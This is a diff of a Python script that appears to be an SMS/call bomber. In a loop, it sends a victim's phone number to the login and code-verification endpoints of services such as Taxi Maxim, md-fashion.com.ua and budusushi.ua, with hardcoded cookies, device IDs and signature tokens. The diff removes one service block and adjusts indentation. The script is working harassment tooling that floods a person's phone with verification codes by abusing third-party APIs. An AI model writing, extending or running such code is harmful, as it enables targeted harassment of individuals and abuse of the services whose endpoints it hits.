@@ -112,14 +112,9 @@ for _ in track(range(run)):
     except:
             print('Не отправлено (instagram.com)')
     try:
-			requests.post('https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send?device=Xiaomi%2FMi+9T+Pro%2F10&locale=uk&source=playmarket&city=297&udid=ef94a46599d0e604&version=3.12.20&density=xxhdpi&platform=CLAPP_ANDROID&latitude=48.2552685&radius=47.861&rt=154436.516&longitude=25.9334519&sig=1411965450e7f390089c2cfab52ef029', json={'locale': 'uk','phone':number,'type':'droppedcall','smstoken':'vEMdSjfFO6R','isDefault':'1','mcc':'255'}, headers={'X-Requested-With':'XMLHttpRequest', 'Accept-Charset':'UTF-8', 'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'X-Client-RequestTimeout':'10', 'Dark-Theme':'false', 'Url-Scheme':'maximzakaz', 'Connection':'Connection', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'DNT':'1'})
-                        print('cabinet.taximaxim.ru')
-    except:
-                        print('Не отправлено (cabinet.taximaxim.ru)')
-    try:
 			requests.post('https://md-fashion.com.ua/bpm/validate-contact', data={'phone':'+' + number}, headers=headers)
             print('md-fashion.com.ua')
-   except:
+    except:
             print('Не отправлено (md-fashion.com.ua)')
     try:#numberis
 			requests.post('https://be.budusushi.ua/login', data={'LoginForm[username]': phone[2:]}, headers={'X-Requested-With':'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; _gcl_au=1.1.1732122179.1637071555; _ga=GA1.2.781960988.1637071555; _gid=GA1.2.978787047.1637071555; _gat_UA-106901939-3=1', 'referer': 'https://budusushi.ua/', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 'DNT':'1'})
